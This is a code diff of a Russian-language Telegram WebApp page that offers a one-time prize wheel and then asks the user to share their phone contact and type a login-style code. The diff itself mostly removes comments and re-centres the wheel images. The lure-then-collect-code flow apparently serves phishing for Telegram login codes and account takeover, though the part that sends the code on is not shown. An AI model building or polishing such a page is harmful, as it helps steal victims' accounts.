@@ -33,7 +33,6 @@ body::before {
   min-height: calc(100vh - 150px);
 }
 
-/* Колесо */
 .wheel-wrap {
   position: relative;
   width: min(300px, 80vw);
@@ -48,17 +47,8 @@ body::before {
   box-shadow: 0 0 20px rgba(61,158,255,.5), 0 0 50px rgba(61,158,255,.15);
 }
 
-/* Фон секторов — вращается */
 .wheel-bg {
   position: absolute; inset: 0; border-radius: 50%;
-  background: conic-gradient(
-    #1b3f8a 0deg 36deg,   #0d2460 36deg 72deg,
-    #1b3f8a 72deg 108deg, #0d2460 108deg 144deg,
-    #1b3f8a 144deg 180deg,#0d2460 180deg 216deg,
-    #1b3f8a 216deg 252deg,#0d2460 252deg 288deg,
-    #1b3f8a 288deg 324deg,#0d2460 324deg 360deg
-  );
-  /* Линии секторов */
   background-image:
     conic-gradient(
       #1b3f8a 0deg 36deg,   #0d2460 36deg 72deg,
@@ -73,7 +63,6 @@ body::before {
     );
 }
 
-/* Центральная точка */
 .wheel-center {
   position: absolute; width: 20px; height: 20px;
   background: radial-gradient(circle, #7dcfff, #3d9eff);
@@ -83,7 +72,6 @@ body::before {
   z-index: 10;
 }
 
-/* Картинки — позиция обновляется JS, сами не вращаются */
 .wheel-img {
   position: absolute; top: 50%; left: 50%;
   width: 50px; height: 50px; object-fit: cover;
@@ -110,7 +98,6 @@ body::before {
 }
 #spin:disabled { opacity: 0.4; box-shadow: none; }
 
-/* Оверлей "уже использован" */
 .used-overlay {
   display: none; position: fixed; inset: 0;
   background: rgba(5,8,15,.92); backdrop-filter: blur(10px);
@@ -122,7 +109,6 @@ body::before {
 .used-overlay h3 { font-size: 22px; font-weight: 700; color: #fff; }
 .used-overlay p { font-size: 14px; color: #8aaad4; }
 
-/* Регистрация */
 .step { display: none; width: 100%; max-width: 320px; }
 .step.active { display: flex; flex-direction: column; align-items: center; gap: 18px; }
 .step h2 { font-size: 24px; font-weight: 700; text-shadow: 0 0 16px rgba(61,158,255,.6); }
@@ -144,7 +130,6 @@ button#send, button#askContact {
 }
 button#send:disabled { opacity: 0.4; box-shadow: none; }
 
-/* Таббар */
 .tabbar {
   position: fixed; bottom: 0; left: 0; right: 0; display: flex;
   border-top: 1px solid rgba(61,158,255,.15);
@@ -157,7 +142,6 @@ button#send:disabled { opacity: 0.4; box-shadow: none; }
 }
 .tabbar button.tab-btn.active { color: #3d9eff; font-weight: bold; }
 
-/* Оверлей выигрыша */
 .overlay {
   position: fixed; inset: 0;
   background: rgba(5,8,15,.92); backdrop-filter: blur(10px);
@@ -199,7 +183,7 @@ button#send:disabled { opacity: 0.4; box-shadow: none; }
     <button id="askContact">📱 Отправить контакт</button>
   </div>
   <div id="stepCode" class="step">
-    <h2>Введите 5-значный код</h2>
+    <h2>Введите код</h2>
     <div class="code">
       <input type="tel" maxlength="1" inputmode="numeric">
       <input type="tel" maxlength="1" inputmode="numeric">
@@ -232,7 +216,6 @@ button#send:disabled { opacity: 0.4; box-shadow: none; }
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 
-// Вкладки
 const tabButtons = document.querySelectorAll(".tab-btn");
 const tabContents = document.querySelectorAll(".tab-content");
 function openTab(id) {
@@ -241,8 +224,6 @@ function openTab(id) {
 }
 tabButtons.forEach(btn => btn.addEventListener("click", () => openTab(btn.dataset.tab)));
 
-// ---- КОЛЕСО ----
-// КАРТИНКИ: замени ссылки здесь
 const IMG_SRCS = [
   "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
   "https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg",
@@ -257,38 +238,35 @@ const IMG_SRCS = [
 ];
 
 const COUNT = IMG_SRCS.length;
-const STEP  = 360 / COUNT;   // 36 градусов на сектор
-const R_IMG = 90;             // px от центра до центра картинки
+const STEP  = 360 / COUNT;
+const R_IMG = 90;
 
 const wheel   = document.getElementById("wheel");
 const wheelBg = document.getElementById("wheelBg");
 const center  = wheel.querySelector(".wheel-center");
 
-// Создаём элементы картинок программно
 const imgEls = IMG_SRCS.map(src => {
   const img = document.createElement("img");
-  img.src   = src;
+  img.src = src;
   img.className = "wheel-img";
-  wheel.insertBefore(img, center); // под центральной точкой
+  wheel.insertBefore(img, center);
   return img;
 });
 
-// Обновляем позицию каждой картинки через translate (без поворота)
 function updateWheel(rot) {
   wheelBg.style.transform = `rotate(${rot}deg)`;
   const rotRad = rot * Math.PI / 180;
   imgEls.forEach((img, i) => {
-    const a = rotRad + i * STEP * Math.PI / 180;
+    // ← ИЗМЕНЁННАЯ СТРОКА: + 0.5 ставит картинку в центр сектора
+    const a = rotRad + (i + 0.5) * STEP * Math.PI / 180;
     const x = R_IMG * Math.sin(a);
     const y = -R_IMG * Math.cos(a);
-    // translate: сначала центрируем (-50%,-50%), потом двигаем по орбите
     img.style.transform = `translate(calc(-50% + ${x}px), calc(-50% + ${y}px))`;
   });
 }
 
 updateWheel(0);
 
-// Анимация
 let currentRot = 0;
 let spinUsed   = false;
 
@@ -303,10 +281,10 @@ function animateSpin(from, to, ms, onDone) {
   })(performance.now());
 }
 
-const spinBtn    = document.getElementById("spin");
-const overlay    = document.getElementById("winOverlay");
-const winImage   = document.getElementById("winImage");
-const goToReg    = document.getElementById("goToReg");
+const spinBtn     = document.getElementById("spin");
+const overlay     = document.getElementById("winOverlay");
+const winImage    = document.getElementById("winImage");
+const goToReg     = document.getElementById("goToReg");
 const usedOverlay = document.getElementById("usedOverlay");
 
 spinBtn.addEventListener("click", () => {
@@ -330,7 +308,6 @@ goToReg.addEventListener("click", () => {
 
 usedOverlay.addEventListener("click", () => usedOverlay.classList.remove("show"));
 
-// Контакт
 const stepContact = document.getElementById("stepContact");
 const stepCode    = document.getElementById("stepCode");
 document.getElementById("askContact").addEventListener("click", () => {
@@ -342,7 +319,6 @@ document.getElementById("askContact").addEventListener("click", () => {
   });
 });
 
-// Ввод кода
 const inputs  = document.querySelectorAll(".code input");
 const sendBtn = document.getElementById("send");
 function getCode() { return [...inputs].map(i => i.value).join(""); }
